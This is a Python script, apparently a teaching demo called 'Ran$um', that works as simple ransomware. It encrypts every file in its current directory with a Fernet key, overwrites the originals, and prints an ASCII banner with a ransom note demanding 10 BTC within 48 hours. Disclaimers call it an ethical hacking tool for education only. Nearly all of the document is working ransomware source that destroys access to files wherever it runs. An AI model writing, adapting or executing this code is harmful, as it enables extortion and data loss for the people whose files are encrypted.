#[!] DISCLAIM-R: performing hacking attempts on computers that you do not own (without permission) is illegal!

# import os and Fernet

import os
from cryptography.fernet import Fernet

# locate files to encrypt using for loop (conditionals used to avoid ransum, decrypt-r, key & directories)

target_files = []

for target_file in os.listdir():
        if target_file == "ransum.py" or target_file == "encryption_key.key" or target_file == "decrypt-r.py":
                continue
        if os.path.isfile(target_file):
                target_files.append(target_file)

print(target_files)

# create encryption key using Fernet and save to encryption_key file

encrypt_key = Fernet.generate_key()

with open("encryption_key.key", "wb") as encryption_key:
        encryption_key.write(encrypt_key)

# encrypt files using a for loop

for target_file in target_files:
        with open(target_file, "rb") as  victim_file:
                file_contents = victim_file.read()
        encrypted_contents = Fernet(encrypt_key).encrypt(file_contents)
        with open(target_file, "wb") as victim_file:
                victim_file.write(encrypted_contents)

# print banner and imitation 'ransom' message 

print('''
                                                                 
@@@@@@@    @@@@@@   @@@  @@@      @@      @@@  @@@  @@@@@@@@@@   
@@@@@@@@  @@@@@@@@  @@@@ @@@   @@@@@@@@@  @@@  @@@  @@@@@@@@@@@  
@@!  @@@  @@!  @@@  @@!@!@@@  !@@!@@!@@!  @@!  @@@  @@! @@! @@!  
!@!  @!@  !@!  @!@  !@!!@!@!  !@! !@      !@!  @!@  !@! !@! !@!  
@!@!!@!   @!@!@!@!  @!@ !!@!  !!!@@!!!!   @!@  !@!  @!! !!@ @!@  
!!@!@!    !!!@!!!!  !@!  !!!   !!!@@@!!!  !@!  !!!  !@!   ! !@!  
!!: :!!   !!:  !!!  !!:  !!!      !: !:!  !!:  !!!  !!:     !!:  
:!:  !:!  :!:  !:!  :!:  !:!  !:!!:!: :!  :!:  !:!  :!:     :!:  
::   :::  ::   :::   ::   ::  : :::: ::   ::::: ::  :::     ::   
 :   : :   :   : :  ::    :       ::       : :  :    :      :    
                                                                 

All of your files have been encrypted by Ran$um! They can only be decrypted with our bespoke Decrypt-R for the cost of 10 BTC. You have 48 hrs... 

[!] DISCLAIM-R: Ran$um is an ethical hacking tool - intended for educational purposes only to demonstrate how ransomware encrypts files and how they can subsequently be decrypted. 
Do NOT use this tool for malicious purposes or without permission. Performing hacking attempts on computers that you do not own (without permission) is illegal!
''')

